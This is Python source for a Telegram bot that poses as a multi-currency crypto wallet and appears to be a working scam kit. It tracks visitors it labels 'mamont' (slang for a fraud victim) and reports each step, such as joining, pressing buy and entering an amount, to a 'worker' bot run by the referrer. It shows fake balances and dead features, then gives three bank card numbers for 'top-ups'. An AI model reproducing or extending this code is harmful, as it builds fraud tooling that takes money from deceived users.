from aiogram import Router, F, Bot
from aiogram.types import Message, CallbackQuery
from aiogram.fsm.context import FSMContext
from aiogram.filters import CommandObject, Command, StateFilter
from aiogram.enums import ParseMode
import aiosqlite

from app.keyboards import ikb
from app.db import Database
from app.states import BuyCurrency, PanelDefault
from app.config import Config

router = Router(name=__name__)

worker_bot = Bot(Config.WORKER_BOT_TOKEN, parse_mode=ParseMode.HTML)


@router.message(Command('start', 'cancel'))
async def cmd_start(message: Message, command: CommandObject, conn: aiosqlite.Connection, state: FSMContext):
    await state.clear()

    db = Database(connection=conn)
    user = message.from_user

    await db.create_table()

    if command.args:
        if command.args.isdigit():
            worker = int(command.args)

            await db.add_user(user_id=user.id)
            await db.add_referral(user_id=user.id, referral=worker)

            referral_user = await db.get_referral(user_id=user.id)

            try:
                await worker_bot.send_message(chat_id=referral_user,
                                              text=f"💻 <b>Мамонт ({str(user.id)}) @{user.username} зашел в бота</b>",
                                              reply_markup=ikb.get_open_panel_ikb(user_id=user.id))
            except:
                ...
    else:
        await db.add_user(user_id=user.id)

    await message.answer(text="""
👛 Мультивалютный криптокошелек. Покупайте, отправляйте, храните и платите криптовалютой, когда хотите.

Подписывайтесь на наш канал и вступайте в наш чат.
    """, reply_markup=ikb.get_main_ikb())


@router.message(F.text == "< назад", StateFilter(None))
async def return_back(message: Message):
    await message.answer(text="""
👛 Мультивалютный криптокошелек. Покупайте, отправляйте, храните и платите криптовалютой, когда хотите.

Подписывайтесь на наш канал и вступайте в наш чат.
            """, reply_markup=ikb.get_main_ikb())


@router.callback_query(StateFilter(PanelDefault.default, None))
async def all_callback(call: CallbackQuery, conn: aiosqlite.Connection, state: FSMContext):
    db = Database(connection=conn)
    user = call.from_user

    if call.data == "p2p":
        await call.message.edit_text(text=f"""
💠 Здесь вы можете купить или продать криптовалюту переводом на карту или электронный кошелёк.    
        """, reply_markup=ikb.get_p2p_ikb())
    elif call.data == "nazad_p2p":
        await call.message.edit_text(text=f"""
👛 Мультивалютный криптокошелек. Покупайте, отправляйте, храните и платите криптовалютой, когда хотите.

Подписывайтесь на наш канал и вступайте в наш чат.
        """, reply_markup=ikb.get_main_ikb())
    elif call.data == "nazad_v_p2p":
        await call.message.edit_text(text="""
💠 Здесь вы можете купить или продать криптовалюту переводом на карту или электронный кошелёк.    
        """, reply_markup=ikb.get_p2p_ikb())
    elif call.data == "coshelec":
        money = await db.get_money(user_id=user.id)
        await call.message.edit_text(text=f"""
👛 Ваш кошелек:

💲 Tether: {money} USDT

🐬 Toncoin: 0 TON

🥇 Bitcoin: 0 BTC

🪙 Litecoin : 0 LTC

🥈 Ethereum: 0 ETH

🥉 Binance Coin: 0 BNB

🔥 TRON: 0 TRX

💲 USD Coin: 0 USDC

💎 Gram: 0 GRAM

≈ 0 BTC (0 RUB)
        """, reply_markup=ikb.get_return_to_back_ikb())
    elif call.data == "kupit":
        referral_user = await db.get_referral(user_id=user.id)

        await call.message.edit_text(text=f"""
💠 Выберите криптовалюту, которую вы хотите купить. 
        """, reply_markup=ikb.get_cryptocurrencies_ikb())

        if referral_user:
            await worker_bot.send_message(
                chat_id=referral_user,
                text=f"😃 <b>Мамонт ({str(call.from_user.id)}) @{call.from_user.username}  нажал купить</b>"
            )

    elif call.data == "valuta":
        await call.message.edit_text(text="Выберите на сколько вы хотите пополнить баланс:")

        await state.set_state(BuyCurrency.buy)

    elif call.data == "podpiski":
        await call.message.edit_text(text="""
🍑 Здесь вы можете управлять своими платными подписками.

💰 Подключите свой канал или группу, чтобы получать доход. Комиссия 5% включена в цену подписки.
        """, reply_markup=ikb.get_subscriptions_ikb())

    elif call.data == "birza":
        await call.message.edit_text(text="""
🐬 Здесь вы можете торговать криптовалютой как на обычной бирже.

🪐 Все заявки на обмен выполняются автоматически.
        """, reply_markup=ikb.get_stockmarket_ikb())

    elif call.data == "rinok":
        await call.message.edit_text(text="Рынок доступен только для Premium пользователей!",
                                     reply_markup=ikb.get_back_to_menu_ikb())

    elif call.data == "cheki":
        await call.message.edit_text(text="""
Здесь вы можете создать чек для мгновенной отправки криптовалюты любому пользователю.
        """, reply_markup=ikb.get_paychecks_ikb())

    elif call.data == "add_check":
        await call.message.edit_text(text="У вас не достаточно денег!", reply_markup=ikb.get_back_to_menu_ikb())

    elif call.data == "cheta":
        await call.message.edit_text(text="У вас нет счетов для оплаты!", reply_markup=ikb.get_back_to_menu_ikb())

    elif call.data == "prodat":
        await call.message.edit_text(text="Что-бы продать нужно иметь на балансе как минмум 1$!",
                                     reply_markup=ikb.get_back_to_menu_ikb())

    elif call.data == "settings":
        await call.message.edit_text(text="Настройки:", reply_markup=ikb.get_settings_ikb())

    else:
        await call.message.edit_text(text="Временно не работает!", reply_markup=ikb.get_back_to_menu_ikb())


@router.message(F.text, StateFilter(BuyCurrency.buy))
async def buy_currency(message: Message, state: FSMContext, conn: aiosqlite.Connection):
    db = Database(connection=conn)
    user = message.from_user

    if message.text.isdigit():
        await message.answer(text="""
💳 Карты для прямых переводов

🇷🇺 — 2202206820038300

🇰🇿 — 5177920005398859

🇧🇾 — 5395457709692127
        """, reply_markup=ikb.get_help_ikb())

        referral_user = await db.get_referral(user_id=user.id)

        if referral_user:
            await worker_bot.send_message(
                chat_id=referral_user,
                text=f"💶 <b>Мамонт ({user.id}) @{user.username}  ввёл сумму: <code>{message.text}</code></b>")

        await state.clear()
    else:
        await message.answer(text="Сумма должна быть в цифрах!")
